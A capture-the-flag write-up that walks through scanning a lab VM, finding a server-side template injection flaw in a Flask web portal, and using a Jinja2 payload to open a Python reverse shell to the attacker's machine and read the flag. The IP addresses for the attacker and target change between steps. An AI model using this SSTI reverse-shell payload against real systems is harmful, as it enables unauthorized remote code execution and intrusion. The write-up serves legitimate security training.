# Finding flag-1
The CTF machine produced by the .ova was inaccesssible due to unknown login credentials.\
**NOTE:** Make sure both attacker and target VM is in Bridged Network mode.

# Finding IP/website 
On our attacker (Kali) VM we run ```ip a``` to determine the attack interface/address:

```
$ ip a
2: eth0: ...
    inet 192.168.29.173/24 brd 192.168.29.255 scope global dynamic noprefixroute eth0
```

Our Kali IP is **192.168.29.173.**

We scan the subnet to find other hosts:\
```sudo netdiscover -r 192.168.29.0/24```

From the output we observed:
- ```08:00:27``` is a VirtualBox NIC.
- Host **192.168.29.28** with MAC ```08:00:27:4f:d9:a5``` is the CTF VM.

We run nmap to enumerate services on the target:\
```nmap -sC -sV 192.168.29.28```

Key results:
- ```22/tcp``` - OpenSSH 9.2p1 (Debian)
- ```5000/tcp``` - HTTP (Werkzeug httpd 3.1.3) — page title: **R&D Portal**

We visited:\
```http://192.168.29.28:5000```

We also ran a directory scan:\
```gobuster dir -u http://192.168.29.28:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

That revealed a ```/pages``` route.

# Reverse Shell
The website had an input field which was vulnerable to SSTI (server-side template Injection).
## Steps followed:
1. Netcat (In kali terminal):
```
nc -nvlp 4444
```
2. Exploited the SSTI vulnerability using simple python payload
```
{{ ''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['system']('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'') }}
```
where ```192.168.1.6``` is my kali machine's IP\
The above payload allowed to connect kali machine to the CTF machine

(Below is the Output in Kali terminal)
```
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.14] 58992
/bin/sh: 0: can't access tty; job control turned off
$
```
the tty is not accessed 
so we used pty in python to spawn into bin/bash
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then,we used the command ```ls``` to list all files in directory which gave...
```
www-data@ctf-machine:/opt/ssti-lab$ ls
app.py  F14@_0n3.txt  static  wget-log
```

And the command ```cat F14@_0n3.txt``` gave the flag
```
www-data@ctf-machine:/opt/ssti-lab$ cat F14@_0n3.txt
FLAG -> S3Cur1ty_Br3@k_P@55ed
```

```Flag: TCQ2025{S3Cur1ty_Br3@k_P@55ed}```
